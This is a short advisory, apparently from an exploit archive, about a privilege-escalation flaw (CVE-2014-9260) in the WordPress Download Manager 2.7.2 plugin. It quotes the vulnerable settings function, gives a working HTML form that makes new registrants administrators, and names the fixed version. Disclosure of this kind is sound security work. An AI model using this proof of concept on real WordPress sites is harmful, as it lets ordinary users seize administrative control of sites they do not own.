@@ -1,0 +1,47 @@
+# Exploit Title: WordPress Download Manager 2.7.2 Privilege Escalation
+# Date: 24-11-2014
+# Software Link: https://wordpress.org/plugins/download-manager/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+# CVE: CVE-2014-9260
+
+1. Description
+  
+Every registered user can update every WordPress options using basic_settings() function.
+
+function basic_settings()
+{
+    if (isset($_POST['task']) && $_POST['task'] == 'wdm_save_settings') {
+
+        foreach ($_POST as $optn => $optv) {
+            update_option($optn, $optv);
+        }
+        if (!isset($_POST['__wpdm_login_form'])) delete_option('__wpdm_login_form');
+
+
+
+        die('Settings Saved Successfully');
+    }
+    include('settings/basic.php');
+}
+
+http://security.szurek.pl/wordpress-download-manager-272-privilege-escalation.html
+
+2. Proof of Concept
+
+Login as standard user (created using wp-login.php?action=register) then:
+
+<form method="post" action="http://wordpress-url/wp-admin/admin-ajax.php?action=wdm_settings">
+    <input type="hidden" name="task" value="wdm_save_settings">
+    <input type="hidden" name="section" value="basic">
+    <input type="hidden" name="default_role" value="administrator">
+    <input type="submit" value="Hack!">
+</form>
+
+After that create new user using wp-login.php?action=register. Newly created user will have admin privileges.
+
+3. Solution:
+  
+Update to version 2.7.3
